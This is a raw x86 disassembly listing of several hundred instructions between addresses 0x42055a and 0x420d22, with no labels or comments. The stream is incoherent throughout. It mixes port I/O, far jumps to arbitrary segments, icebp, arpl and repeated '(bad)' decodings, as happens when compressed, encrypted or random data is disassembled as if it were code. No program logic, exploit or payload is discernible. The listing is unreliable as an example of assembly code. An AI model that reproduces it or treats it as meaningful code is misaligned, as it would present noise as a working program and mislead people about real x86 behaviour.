  42055a:	mov    ebp,0x6b81f12
  42055f:	xchg   esi,eax
  420560:	out    dx,eax
  420561:	push   ss
  420562:	inc    ebx
  420563:	sub    al,0xe0
  420565:	out    dx,al
  420566:	sub    eax,0xa9ff4b85
  42056b:	pop    esi
  42056c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42056d:	in     eax,dx
  42056e:	dec    edi
  42056f:	xor    bh,bl
  420571:	mov    bl,0x49
  420573:	test   DWORD PTR [esi-0x48],0x93a4517c
  42057a:	sub    dl,bl
  42057c:	aad    0xa5
  42057e:	xchg   ebp,eax
  42057f:	out    0x1b,eax
  420581:	lds    ebx,FWORD PTR [edi]
  420583:	lock adc eax,0x9eb1865d
  420589:	jne    0x4205fb
  42058b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42058c:	adc    DWORD PTR [eax+ebx*4+0x35ad6f69],0x14ed3551
  420597:	ins    BYTE PTR es:[edi],dx
  420598:	adc    DWORD PTR [edi],edi
  42059a:	daa    
  42059b:	dec    ebp
  42059c:	inc    ebx
  42059d:	retf   
  42059e:	not    ch
  4205a0:	retf   
  4205a1:	xchg   ebp,eax
  4205a2:	jl     0x420599
  4205a4:	adc    BYTE PTR [edx-0x14],dl
  4205a7:	xchg   edi,eax
  4205a8:	mov    esi,0x1c7b46b3
  4205ad:	and    al,0xea
  4205af:	stos   BYTE PTR es:[edi],al
  4205b0:	jmp    0xc02:0x88aa2709
  4205b7:	and    eax,0xd024ba7d
  4205bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205bd:	mov    bl,0x5e
  4205bf:	fsubr  st(0),st
  4205c1:	ret    
  4205c2:	(bad)  
  4205c3:	ss or  al,0x30
  4205c6:	jl     0x42057f
  4205c8:	(bad)  [esi]
  4205ca:	sbb    DWORD PTR [edi+0x77d1a638],edx
  4205d0:	inc    ebp
  4205d1:	dec    DWORD PTR [esi]
  4205d3:	mov    dh,0x27
  4205d5:	mov    al,ds:0xaf25daca
  4205da:	push   cs
  4205db:	push   ecx
  4205dc:	int    0xef
  4205de:	mov    ds:0xaee4a31b,al
  4205e3:	fmul   DWORD PTR [esi+eax*2-0x692a1172]
  4205ea:	int3   
  4205eb:	idiv   BYTE PTR [ebp+0x2e272843]
  4205f1:	aam    0xb
  4205f3:	test   eax,0xe6d69033
  4205f8:	fucom  st(0)
  4205fa:	cmp    dl,BYTE PTR [edx+0x746820c2]
  420600:	jl     0x420629
  420602:	stos   BYTE PTR es:[edi],al
  420603:	mov    eax,0x6d39ea42
  420608:	cdq    
  420609:	cmc    
  42060a:	rcr    BYTE PTR [edi+0x13],cl
  42060d:	aas    
  42060e:	mov    eax,0x301dd00c
  420613:	push   ebp
  420614:	out    dx,al
  420615:	xchg   ecx,eax
  420616:	mov    ds:0x8b61ca13,al
  42061b:	mov    DWORD PTR [edi+eax*2-0x75],esp
  42061f:	int3   
  420620:	ret    0x1fe4
  420623:	add    bh,BYTE PTR [esi+eax*2-0x2c]
  420627:	ret    0x163d
  42062a:	dec    edi
  42062b:	fstp   QWORD PTR [esi+0x50e5f5f2]
  420631:	and    DWORD PTR [esi+0x3e16b1ed],edx
  420637:	jno    0x420665
  420639:	mov    edi,0x2ce919e4
  42063e:	idiv   dh
  420640:	lods   eax,DWORD PTR ds:[esi]
  420641:	push   ss
  420642:	xlat   BYTE PTR ds:[ebx]
  420643:	mov    bl,0xee
  420645:	sbb    eax,0xaa866628
  42064a:	mov    dx,0x5abe
  42064e:	or     ecx,DWORD PTR [esi]
  420650:	ins    BYTE PTR es:[edi],dx
  420651:	icebp  
  420652:	jmp    0x1ed51ef2
  420657:	xor    BYTE PTR [ecx+0x64],bl
  42065a:	pop    ss
  42065b:	imul   ebp,DWORD PTR [esi+0x60d471b3],0x2bbfe9ac
  420665:	ror    BYTE PTR [ebx+0x75],cl
  420668:	push   ss
  420669:	adc    eax,0x4ddcce52
  42066e:	jno    0x4206c2
  420670:	push   ss
  420671:	(bad)  
  420672:	sub    eax,0xc1f812ae
  420677:	nop
  420678:	(bad)  [edi+0x23acf860]
  42067e:	loop   0x420628
  420680:	out    0x3b,eax
  420682:	repnz or bl,BYTE PTR [ebp+0x51bb1121]
  420689:	pop    esi
  42068a:	inc    edi
  42068b:	adc    esi,DWORD PTR [esi-0x5d]
  42068e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42068f:	inc    edi
  420690:	jge    0x4206d8
  420692:	sti    
  420693:	mov    cl,BYTE PTR [ebx-0x29]
  420696:	les    esi,FWORD PTR [esi+0x4bffa40]
  42069c:	icebp  
  42069d:	mov    esi,0x4b3cd49
  4206a2:	mov    edi,0x27777286
  4206a7:	fdiv   DWORD PTR [ecx-0x14]
  4206aa:	push   esp
  4206ab:	push   esp
  4206ac:	inc    esi
  4206ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206ae:	xor    bl,ah
  4206b0:	sar    BYTE PTR [edx-0x673f30bb],cl
  4206b6:	mov    dh,0x1c
  4206b8:	sub    DWORD PTR [edx+0x6cda14],0xffffff8c
  4206bf:	shl    BYTE PTR [ebp+0x2ae03922],0x9b
  4206c6:	fstp   st(6)
  4206c8:	pop    ss
  4206c9:	ret    
  4206ca:	sub    al,0x82
  4206cc:	(bad)  
  4206cd:	jmp    0xb1d3:0xcfb68066
  4206d4:	xchg   ebx,eax
  4206d5:	jge    0x420726
  4206d7:	and    DWORD PTR [eax+eax*1],0x16
  4206db:	dec    eax
  4206dc:	mov    bl,0x29
  4206de:	and    al,0x89
  4206e0:	ficomp DWORD PTR [ecx-0x36c1aecc]
  4206e6:	fs in  al,dx
  4206e8:	add    eax,edx
  4206ea:	aad    0xc7
  4206ec:	rol    eax,cl
  4206ee:	fdiv   DWORD PTR [edx]
  4206f0:	and    esp,DWORD PTR [edi-0x2e45f61e]
  4206f6:	fsub   DWORD PTR [ebx-0x58117127]
  4206fc:	stos   BYTE PTR es:[edi],al
  4206fd:	mov    ds:0xbc4749da,al
  420702:	adc    eax,0xfc01fd94
  420707:	mov    ecx,0x9c263113
  42070c:	xchg   edx,eax
  42070d:	and    DWORD PTR [edi+0x43d984dd],0x7
  420714:	mov    ebx,0xcdda1db6
  420719:	mov    WORD PTR [edx+0x37],es
  42071c:	sbb    DWORD PTR [ebp+0x24],esp
  42071f:	das    
  420720:	std    
  420721:	stos   DWORD PTR es:[edi],eax
  420722:	nop
  420723:	test   eax,0x7d402bab
  420728:	jno    0x420739
  42072a:	stc    
  42072b:	mov    ebp,0x69af97b4
  420730:	(bad)  
  420731:	push   edi
  420732:	test   al,0x70
  420734:	sub    edi,esi
  420736:	inc    eax
  420737:	add    BYTE PTR [ebx-0xb],cl
  42073a:	sar    DWORD PTR [ebp+0x173c2fc0],0x15
  420741:	push   esi
  420742:	inc    eax
  420743:	push   ebp
  420744:	or     eax,0x1331abcf
  420749:	pop    ebx
  42074a:	mov    bl,0x5
  42074c:	jle    0x4206f1
  42074e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42074f:	dec    esp
  420750:	jno    0x4207c9
  420752:	stc    
  420753:	add    ah,BYTE PTR [edi]
  420755:	add    BYTE PTR [eax+eax*1+0x3],bl
  420759:	es add eax,0xfc0d3f4d
  42075f:	mov    ebp,0x407dc19d
  420764:	pop    esi
  420765:	out    0x58,al
  420767:	jmp    0x35200ccb
  42076c:	in     eax,dx
  42076d:	cli    
  42076e:	pop    es
  42076f:	mov    ecx,0xe6507dbb
  420774:	imul   edx,DWORD PTR [eax],0x4413a6f4
  42077a:	mov    dl,0xb0
  42077c:	jno    0x4207d8
  42077e:	mov    edi,0xab310c33
  420783:	test   DWORD PTR [esi-0x77ea021b],edx
  420789:	jp     0x420726
  42078b:	and    BYTE PTR [ebx],ch
  42078d:	loop   0x4207da
  42078f:	arpl   WORD PTR [eax-0x30],ax
  420792:	dec    esi
  420793:	fcomp  DWORD PTR [ebx]
  420795:	cs inc edx
  420797:	inc    edx
  420798:	mov    ch,0xa4
  42079a:	sbb    dh,BYTE PTR [edi]
  42079c:	mov    dl,0xfb
  42079e:	es aad 0x3c
  4207a1:	imul   edi,DWORD PTR [esi],0xffffffcd
  4207a4:	push   0x36
  4207a6:	adc    al,0x42
  4207a8:	cs js  0x4207ff
  4207ab:	sbb    BYTE PTR [edi+0x79],dh
  4207ae:	shr    DWORD PTR [ecx+0x67ba206b],cl
  4207b4:	mov    bl,0x51
  4207b6:	push   ebx
  4207b7:	sub    BYTE PTR [esp+ebx*4-0x693495ac],0x1a
  4207bf:	pushf  
  4207c0:	sbb    DWORD PTR [edi],eax
  4207c2:	mov    bh,al
  4207c4:	in     eax,dx
  4207c5:	push   ss
  4207c6:	adc    al,0xa4
  4207c8:	dec    esi
  4207c9:	add    al,BYTE PTR [esi+edx*8-0xd]
  4207cd:	cld    
  4207ce:	hlt    
  4207cf:	xchg   ch,al
  4207d1:	je     0x420791
  4207d3:	mov    cl,0x46
  4207d5:	mov    BYTE PTR [esp+ebx*4+0x4f],dh
  4207d9:	bound  eax,QWORD PTR [ecx+edx*1+0x5f5e072]
  4207e0:	dec    eax
  4207e1:	imul   eax,DWORD PTR [esi-0x32822bfd],0xffffffb9
  4207e8:	outs   dx,BYTE PTR ds:[esi]
  4207e9:	dec    ecx
  4207ea:	cmp    al,BYTE PTR [edi-0x3fbce82]
  4207f0:	mov    WORD PTR [edi+0x1b33e0be],ss
  4207f6:	test   al,0xf2
  4207f8:	sbb    eax,0x49d3889f
  4207fd:	xchg   ecx,eax
  4207fe:	mov    ebx,0x32188ab9
  420803:	aas    
  420804:	into   
  420805:	jge    0x4207e1
  420807:	xchg   ebp,eax
  420808:	test   al,0x77
  42080a:	test   al,0x3f
  42080c:	in     eax,0xb5
  42080e:	(bad)  
  420810:	cmp    dh,BYTE PTR ds:0xbe24396f
  420816:	xchg   ecx,eax
  420817:	in     al,dx
  420818:	pusha  
  420819:	cmp    BYTE PTR [ebp+0x8],bh
  42081c:	das    
  42081d:	sbb    bl,0xae
  420820:	mov    dl,0x3f
  420822:	call   0xd81efc95
  420827:	out    dx,al
  420828:	pusha  
  420829:	outs   dx,DWORD PTR ds:[esi]
  42082a:	mov    ah,BYTE PTR [ecx+0x12]
  42082d:	in     eax,dx
  42082e:	cmc    
  42082f:	loope  0x4208a5
  420831:	in     al,0x14
  420833:	iret   
  420834:	les    ebx,FWORD PTR [edx+0x6a6e9429]
  42083a:	popa   
  42083b:	fisub  WORD PTR [esp+ebx*1+0x4f]
  42083f:	push   ds
  420840:	xor    al,0x9e
  420842:	aaa    
  420843:	add    eax,0x87220d83
  420849:	test   eax,0x16355e97
  42084e:	mov    ds,ebx
  420850:	stc    
  420851:	xchg   DWORD PTR [ecx+eiz*2+0x2e],ebp
  420855:	xor    ebx,DWORD PTR [ecx+0x51]
  420858:	dec    ebp
  420859:	xor    bl,BYTE PTR [edi-0x3d]
  42085c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42085d:	mov    eax,0xa06fee09
  420862:	dec    esi
  420863:	out    dx,al
  420864:	mov    al,0x15
  420866:	inc    eax
  420867:	pusha  
  420868:	or     bh,BYTE PTR [edi-0x44bcad6e]
  42086e:	cmp    bh,BYTE PTR [ebp-0x27]
  420871:	in     al,dx
  420872:	dec    esp
  420873:	inc    edi
  420874:	rcr    dl,cl
  420876:	adc    edi,DWORD PTR [ebx+0x1013ed7b]
  42087c:	xchg   esi,eax
  42087d:	inc    edi
  42087e:	fisub  WORD PTR [eax+0x30]
  420881:	mov    ds:0x1b115b73,eax
  420886:	and    BYTE PTR [edx+0x56],al
  420889:	mov    bl,0xb4
  42088b:	mov    eax,ds:0x177ae9e1
  420890:	(bad)  
  420891:	enter  0x726b,0x1f
  420895:	sub    al,0x15
  420897:	into   
  420898:	jo     0x420853
  42089a:	cs jns 0x420851
  42089d:	sbb    edi,DWORD PTR [edx]
  42089f:	cli    
  4208a0:	adc    dl,dh
  4208a2:	or     al,0x7c
  4208a4:	ret    
  4208a5:	mov    dh,0xa1
  4208a7:	cs xor ch,cl
  4208aa:	xchg   edx,eax
  4208ab:	rol    DWORD PTR [edx+0x588bd805],cl
  4208b1:	dec    ebp
  4208b2:	xchg   edi,eax
  4208b3:	mov    dl,0xe2
  4208b5:	stc    
  4208b6:	mov    al,0xa3
  4208b8:	js     0x420881
  4208ba:	clc    
  4208bb:	lea    ebx,[eax+0x3d5568dd]
  4208c1:	sub    dl,0x36
  4208c4:	mov    dl,0xb7
  4208c6:	mov    esi,0x54217fed
  4208cb:	out    dx,eax
  4208cc:	fistp  DWORD PTR [ecx+eiz*2+0x79bdeb70]
  4208d3:	out    0x18,al
  4208d5:	mov    al,BYTE PTR [esp+eiz*2+0x4d]
  4208d9:	cmp    BYTE PTR [edi],0xa8
  4208dc:	xchg   eax,edi
  4208de:	mov    esp,esi
  4208e0:	xchg   ecx,eax
  4208e1:	cmp    eax,0x389ba758
  4208e6:	(bad)  
  4208e8:	mov    DWORD PTR [ecx+0x1426a4e3],edx
  4208ee:	xchg   ecx,eax
  4208ef:	mov    WORD PTR [eax-0x35],?
  4208f2:	and    DWORD PTR [eax-0x32],ebp
  4208f5:	mov    dl,0x94
  4208f7:	hlt    
  4208f8:	out    0xf,al
  4208fa:	cmp    eax,0x546ad17d
  4208ff:	not    DWORD PTR [edx]
  420901:	cli    
  420902:	stc    
  420903:	leave  
  420904:	(bad)  
  420905:	aaa    
  420906:	imul   edi,DWORD PTR [edi+0x346ba001],0x43949349
  420910:	push   esi
  420911:	adc    eax,0xeb735fcf
  420916:	das    
  420917:	jmp    0x4bed:0x9bf64011
  42091e:	lock xchg edx,eax
  420920:	jae    0x420922
  420922:	fbld   TBYTE PTR [ebp+0x2e]
  420925:	test   al,0x2d
  420927:	xor    eax,0xe60a1075
  42092c:	les    edi,FWORD PTR [ebx]
  42092e:	ret    
  42092f:	push   esi
  420930:	(bad)  
  420931:	aad    0x81
  420933:	mov    DWORD PTR [edi],0x87eb387c
  420939:	nop
  42093a:	mov    edi,0x92ce0327
  42093f:	and    eax,0x365bb549
  420944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420945:	(bad)  
  420946:	inc    ecx
  420947:	shl    DWORD PTR [esp+eax*2],0xbd
  42094b:	ror    DWORD PTR [edx-0x72],1
  42094e:	cld    
  42094f:	cmp    eax,0x40d9ffc7
  420954:	add    DWORD PTR [edx+0x1e],edi
  420957:	jnp    0x420910
  420959:	cld    
  42095a:	mov    ecx,0xd762db66
  42095f:	loope  0x42098c
  420961:	mov    edi,0x8bacee82
  420966:	xor    eax,0x54bd82e4
  42096b:	sar    DWORD PTR [ebx+edi*1+0x2bb52ab1],0xd7
  420973:	ins    BYTE PTR es:[edi],dx
  420974:	inc    edx
  420975:	adc    edi,ebx
  420977:	add    eax,0xd45c3548
  42097c:	adc    eax,0x4e99ca09
  420981:	hlt    
  420982:	loope  0x4209c1
  420984:	jo     0x4209da
  420986:	jbe    0x4209d4
  420988:	out    0xbd,al
  42098a:	dec    esp
  42098b:	jle    0x42094b
  42098d:	loopne 0x420995
  42098f:	into   
  420990:	ror    BYTE PTR [eax-0x3a],0xad
  420994:	mov    esp,0xabc9114f
  420999:	test   al,0x92
  42099b:	jb     0x420a07
  42099d:	push   0xffffffe0
  42099f:	js     0x420922
  4209a1:	or     eax,0xa38d13f3
  4209a6:	adc    al,0x54
  4209a8:	test   BYTE PTR [esi],dl
  4209aa:	outs   dx,DWORD PTR es:[esi]
  4209ac:	jp     0x4209c3
  4209ae:	pop    edi
  4209af:	imul   ecx,esi,0x388ee7c6
  4209b5:	jp     0x4209dd
  4209b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209b8:	inc    esp
  4209b9:	fidiv  WORD PTR [edi]
  4209bb:	mov    esi,0x59d449d0
  4209c0:	or     edx,DWORD PTR [eax]
  4209c2:	mov    esp,0xf7463379
  4209c7:	jns    0x420a02
  4209c9:	and    ebp,ebx
  4209cb:	sbb    al,0x31
  4209cd:	fld    DWORD PTR [ebx*8+0x10e26ae4]
  4209d4:	push   edx
  4209d5:	int3   
  4209d6:	sub    dl,BYTE PTR [eax]
  4209d8:	cld    
  4209d9:	loop   0x42099a
  4209db:	pop    ss
  4209dc:	leave  
  4209dd:	cmp    al,0x3b
  4209df:	xchg   ebp,eax
  4209e0:	xchg   edi,eax
  4209e1:	push   es
  4209e2:	jns    0x420a1b
  4209e4:	leave  
  4209e5:	aam    0xd5
  4209e7:	push   esi
  4209e8:	pop    ebp
  4209e9:	pop    es
  4209ea:	inc    ebp
  4209eb:	pop    ebp
  4209ec:	pop    ebp
  4209ed:	pop    edx
  4209ee:	or     DWORD PTR [ebx-0x252aa3a0],esp
  4209f4:	arpl   ax,sp
  4209f6:	icebp  
  4209f7:	pop    ds
  4209f8:	pushf  
  4209f9:	adc    BYTE PTR [ecx+0x1a],0x5d
  4209fd:	mov    bl,0x9
  4209ff:	dec    edx
  420a00:	sub    esi,DWORD PTR [edx]
  420a02:	mov    ebp,0x948f45ad
  420a07:	adc    BYTE PTR [esi-0x67],bl
  420a0a:	inc    ebp
  420a0b:	jmp    0x4209ca
  420a0d:	add    al,0xff
  420a0f:	sahf   
  420a10:	into   
  420a11:	lods   eax,DWORD PTR ds:[esi]
  420a12:	sub    BYTE PTR [ebx+esi*2+0x7c],ah
  420a16:	jns    0x420a0b
  420a18:	sbb    cl,BYTE PTR ds:[edx]
  420a1b:	test   BYTE PTR [edx+ebp*4],cl
  420a1e:	sub    ah,ch
  420a20:	popa   
  420a21:	mov    al,ds:0x323cdc60
  420a26:	fwait
  420a27:	lock arpl cx,cx
  420a2a:	xchg   ebp,eax
  420a2b:	pushf  
  420a2c:	popa   
  420a2d:	mov    eax,ss:0xc7ee309a
  420a33:	push   cs
  420a34:	xor    BYTE PTR [eax+edi*1+0x14],0x65
  420a39:	sbb    al,0x8a
  420a3b:	push   0x684b2167
  420a40:	ja     0x420a86
  420a42:	icebp  
  420a43:	or     cl,BYTE PTR [edi+edx*2]
  420a46:	inc    edi
  420a47:	and    BYTE PTR [esp+ebp*2-0x3],bh
  420a4b:	or     ebx,DWORD PTR [edi-0x6ae1a70b]
  420a51:	sub    eax,0x6ce9f3b3
  420a56:	dec    edi
  420a57:	out    0xbc,eax
  420a59:	outs   dx,DWORD PTR ds:[esi]
  420a5a:	clc    
  420a5b:	pop    ebx
  420a5c:	inc    ebp
  420a5d:	adc    BYTE PTR [ecx+0x27],0x3
  420a61:	push   edx
  420a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a63:	jecxz  0x420aad
  420a65:	outs   dx,DWORD PTR ds:[esi]
  420a66:	mov    ds:0xb3aeffe0,eax
  420a6b:	push   0x45
  420a6d:	lock jl 0x420ab3
  420a70:	dec    edi
  420a71:	aam    0x7d
  420a73:	mov    edi,esi
  420a75:	add    DWORD PTR [esp+eiz*4],ebp
  420a78:	stos   DWORD PTR es:[edi],eax
  420a79:	leave  
  420a7a:	or     BYTE PTR [edx-0x658ca34e],0x3c
  420a81:	push   ds
  420a82:	jmp    0xf109:0x75157a9c
  420a89:	cmp    ah,ch
  420a8b:	sub    bl,BYTE PTR [esi]
  420a8d:	inc    ebp
  420a8e:	jae    0x420aca
  420a90:	and    eax,0x4dae1dfe
  420a95:	mov    edi,0x5f7b7073
  420a9a:	xlat   BYTE PTR ds:[ebx]
  420a9b:	jne    0x420ad9
  420a9d:	in     al,0x8
  420a9f:	sbb    DWORD PTR [eax],ebp
  420aa1:	outs   dx,DWORD PTR ds:[esi]
  420aa2:	es pop esp
  420aa4:	shr    BYTE PTR [esi+ebp*4-0x34a39ac7],1
  420aab:	mov    ah,0xf8
  420aad:	mul    esp
  420aaf:	popf   
  420ab0:	adc    dl,dl
  420ab2:	push   edi
  420ab3:	mov    edi,0xc892fff1
  420ab8:	mov    cl,0x63
  420aba:	fild   QWORD PTR [edx+ebx*2+0x7c3959a7]
  420ac1:	(bad)  
  420ac2:	data16 shl BYTE PTR [ebx+0x512f1af3],0x17
  420aca:	adc    ch,BYTE PTR [ecx]
  420acc:	cli    
  420acd:	push   eax
  420ace:	fidiv  WORD PTR [ebx-0x6f]
  420ad1:	rol    DWORD PTR ds:[esi-0x10],cl
  420ad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ad6:	out    0xbc,eax
  420ad8:	push   0x64
  420ada:	call   0xb25a:0x3d979508
  420ae1:	out    0x21,al
  420ae3:	cdq    
  420ae4:	fldl2t 
  420ae6:	pop    ecx
  420ae7:	popf   
  420ae8:	ja     0x420b2c
  420aea:	jecxz  0x420aaa
  420aec:	outs   dx,DWORD PTR ds:[esi]
  420aed:	fxch   st(1)
  420aef:	sub    dh,0xb5
  420af2:	in     eax,dx
  420af3:	xchg   ecx,eax
  420af4:	fwait
  420af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420af6:	push   esp
  420af7:	dec    ebx
  420af8:	iret   
  420af9:	stos   DWORD PTR es:[edi],eax
  420afa:	fisttp WORD PTR [ebx+0x322a9d43]
  420b00:	ss cmp eax,0xdebf49a6
  420b06:	ins    DWORD PTR es:[edi],dx
  420b07:	mov    ecx,0xe9f12a7c
  420b0c:	xor    edi,DWORD PTR ds:0xf2fe6743
  420b12:	mov    dh,0x71
  420b14:	pop    esi
  420b15:	xor    dl,BYTE PTR [esi+0x74]
  420b18:	cmp    DWORD PTR [ecx+0x70],0xffffffba
  420b1c:	jl     0x420ab1
  420b1e:	into   
  420b1f:	call   0x8d32:0x6c237f77
  420b26:	mov    eax,0x2ecaa18e
  420b2b:	hlt    
  420b2c:	sub    esp,esi
  420b2e:	xchg   ecx,eax
  420b2f:	aam    0x3
  420b31:	adc    ch,BYTE PTR [eax]
  420b33:	lods   al,BYTE PTR ds:[esi]
  420b34:	rep lods eax,DWORD PTR ds:[esi]
  420b36:	adc    eax,DWORD PTR [edx-0x28]
  420b39:	shl    DWORD PTR [ebx+0x4e8cd5e1],1
  420b3f:	test   BYTE PTR [ebx-0xc],bl
  420b42:	(bad)  
  420b43:	fstp   TBYTE PTR [edx-0x5ae256c3]
  420b49:	ins    BYTE PTR es:[edi],dx
  420b4a:	jecxz  0x420b30
  420b4c:	aam    0xb4
  420b4e:	adc    bh,BYTE PTR [ebx+eiz*1-0x6d]
  420b52:	jl     0x420ba6
  420b54:	(bad)  
  420b55:	(bad)  
  420b56:	js     0x420b03
  420b58:	stc    
  420b59:	xlat   BYTE PTR ds:[ebx]
  420b5a:	xor    eax,0x51df83a2
  420b5f:	jno    0x97ad7f3a
  420b65:	add    DWORD PTR [ecx],esi
  420b67:	loopne 0x420b2e
  420b69:	xor    eax,0xef16a6a8
  420b6e:	scas   al,BYTE PTR es:[edi]
  420b6f:	(bad)  
  420b70:	cwde   
  420b71:	sbb    al,dh
  420b73:	xchg   ebx,eax
  420b74:	xchg   BYTE PTR [edi+0xb],bl
  420b77:	sub    DWORD PTR [ebx-0x9],esi
  420b7a:	pusha  
  420b7b:	imul   edx,DWORD PTR [ecx],0x47
  420b7e:	adc    eax,0x3f4e30f7
  420b83:	push   edx
  420b84:	enter  0x8902,0x85
  420b88:	lods   eax,DWORD PTR ds:[esi]
  420b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b8a:	adc    cl,0x4c
  420b8d:	(bad)  
  420b8e:	retf   
  420b8f:	fistp  QWORD PTR [edx+0x3cf49bfa]
  420b95:	mov    ah,0xd7
  420b97:	sbb    BYTE PTR ds:0x39532a3b,dl
  420b9d:	sub    al,0xd1
  420b9f:	xchg   ecx,eax
  420ba0:	or     bh,dh
  420ba2:	daa    
  420ba3:	ret    
  420ba4:	stos   BYTE PTR es:[edi],al
  420ba5:	out    0x7,eax
  420ba7:	xchg   edi,eax
  420ba8:	shl    BYTE PTR [ecx-0x6e90502b],1
  420bae:	ja     0x420bba
  420bb0:	push   ebx
  420bb1:	mov    cl,0x44
  420bb3:	push   es
  420bb4:	popa   
  420bb5:	(bad)  
  420bb7:	push   ds
  420bb8:	dec    ebp
  420bb9:	and    eax,0x7db9a946
  420bbe:	jb     0x420bf4
  420bc0:	dec    esp
  420bc1:	dec    esp
  420bc2:	jnp    0x420bee
  420bc4:	dec    edi
  420bc5:	fild   DWORD PTR [ebx-0x63]
  420bc8:	retf   0x6273
  420bcb:	lds    ebx,FWORD PTR [ecx+0x54]
  420bce:	push   edi
  420bcf:	push   esi
  420bd0:	mov    edi,0x5bce2d57
  420bd5:	inc    ecx
  420bd6:	(bad)  
  420bd7:	std    
  420bd8:	std    
  420bd9:	xlat   BYTE PTR ds:[ebx]
  420bda:	out    0xa9,al
  420bdc:	outs   dx,DWORD PTR ds:[esi]
  420bdd:	or     BYTE PTR [eax-0x29b5886a],bl
  420be3:	and    al,0xec
  420be5:	cmc    
  420be6:	dec    edi
  420be7:	ror    BYTE PTR [edx-0x2b78612c],1
  420bed:	sbb    al,0x57
  420bef:	(bad)  
  420bf0:	fadd   st(7),st
  420bf2:	ins    BYTE PTR es:[edi],dx
  420bf3:	adc    al,0xd5
  420bf5:	cmp    eax,0x9b5a6e3d
  420bfa:	pop    edi
  420bfb:	(bad)  [ebx]
  420bfd:	dec    edi
  420bfe:	pop    ss
  420bff:	dec    esp
  420c00:	adc    eax,0xbcfdc7f6
  420c05:	clc    
  420c06:	dec    edx
  420c07:	fucomip st,st(1)
  420c09:	inc    eax
  420c0a:	clc    
  420c0b:	cmp    esp,ebx
  420c0d:	xchg   ebp,eax
  420c0e:	ret    
  420c0f:	inc    esi
  420c10:	adc    ch,BYTE PTR [edi]
  420c12:	jae    0x420be5
  420c14:	add    al,0x47
  420c16:	out    dx,al
  420c17:	pop    edx
  420c18:	inc    eax
  420c19:	pop    ds
  420c1a:	test   al,0x97
  420c1c:	inc    ecx
  420c1d:	push   edx
  420c1e:	inc    eax
  420c1f:	fdivr  QWORD PTR [edx+0x1d1d85b6]
  420c25:	and    edx,DWORD PTR [edi-0x6c]
  420c28:	aas    
  420c29:	mov    eax,0xc3ebb5e
  420c2e:	cli    
  420c2f:	xor    ebx,eax
  420c31:	lea    eax,ds:0x36813094
  420c37:	mov    bh,0x76
  420c39:	push   0x47
  420c3b:	dec    edi
  420c3c:	push   eax
  420c3d:	out    dx,al
  420c3e:	jmp    0x3b37e0ec
  420c43:	mov    bl,0xc0
  420c45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c46:	or     BYTE PTR [ebx+0x58361070],0x4
  420c4d:	jb     0x420c15
  420c4f:	test   eax,0xb9d0d3bd
  420c54:	in     eax,dx
  420c55:	inc    ebp
  420c56:	repz in eax,dx
  420c58:	or     al,dl
  420c5a:	popa   
  420c5b:	push   cs
  420c5c:	jmp    DWORD PTR [esi+0x2]
  420c5f:	pop    ebp
  420c60:	push   ebx
  420c61:	jo     0x420c8b
  420c63:	xchg   BYTE PTR [edx+0x4e],cl
  420c66:	(bad)  
  420c68:	addr16 mov eax,0xdadc0c91
  420c6e:	nop
  420c6f:	rol    BYTE PTR [esp+ebp*8-0x1f38a432],1
  420c76:	out    0x3a,al
  420c78:	test   eax,0x1d2a997c
  420c7d:	pop    esi
  420c7e:	cs ja  0x420ce3
  420c81:	gs push edx
  420c83:	mov    ch,BYTE PTR [esi-0x3e986c7]
  420c89:	shr    DWORD PTR [esi+ebp*4+0x118eae99],cl
  420c90:	scas   al,BYTE PTR es:[edi]
  420c91:	mov    ah,0x96
  420c93:	das    
  420c94:	sbb    al,0x84
  420c96:	jns    0x420cc2
  420c98:	addr16 xchg esp,eax
  420c9a:	push   ebx
  420c9b:	shr    BYTE PTR [edx+0x5f72414b],cl
  420ca1:	or     eax,0x756b0f02
  420ca6:	imul   esi,DWORD PTR [eax],0xffffffe8
  420ca9:	sub    edi,edi
  420cab:	cmp    esp,DWORD PTR [edx]
  420cad:	xchg   esp,eax
  420cae:	mov    esi,0x57f50734
  420cb3:	pop    ss
  420cb4:	pop    esp
  420cb5:	or     eax,0xdc87c7de
  420cba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cbb:	shl    DWORD PTR [ecx],1
  420cbd:	imul   eax,DWORD PTR [esi],0x87ef6e02
  420cc3:	jnp    0x420d3c
  420cc5:	adc    BYTE PTR [ebp+0x23c1b99d],dh
  420ccb:	int3   
  420ccc:	sbb    al,0x5f
  420cce:	pop    eax
  420ccf:	sbb    eax,0xa79329cd
  420cd4:	gs in  eax,0xe9
  420cd7:	cmp    DWORD PTR [eax+eax*4+0x7a],ecx
  420cdb:	xchg   esp,eax
  420cdc:	push   0x70
  420cde:	sbb    ah,BYTE PTR [ecx+0x18752365]
  420ce4:	imul   ebp,DWORD PTR [ecx+0x60],0x7da9bf53
  420ceb:	nop
  420cec:	das    
  420ced:	ss out 0x76,al
  420cf0:	gs xchg ecx,eax
  420cf2:	inc    esp
  420cf3:	push   eax
  420cf4:	adc    al,al
  420cf6:	test   DWORD PTR [ecx-0x13bf2b7],0x84aff5a0
  420d00:	lods   eax,DWORD PTR ds:[esi]
  420d01:	xor    al,0xf2
  420d03:	pop    es
  420d04:	mov    al,0xa4
  420d06:	sbb    ah,BYTE PTR [eax+0x5ce30b60]
  420d0c:	and    al,BYTE PTR [edi-0x5e9d0adf]
  420d12:	iret   
  420d13:	jp     0x420d25
  420d15:	sub    BYTE PTR [eax],dh
  420d17:	jne    0x420d2a
  420d19:	icebp  
  420d1a:	push   eax
  420d1b:	aas    
  420d1c:	jne    0x420cb0
  420d1e:	mov    eax,DWORD PTR [ecx]
  420d20:	cwde   
  420d21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d22:	or     bl,dl
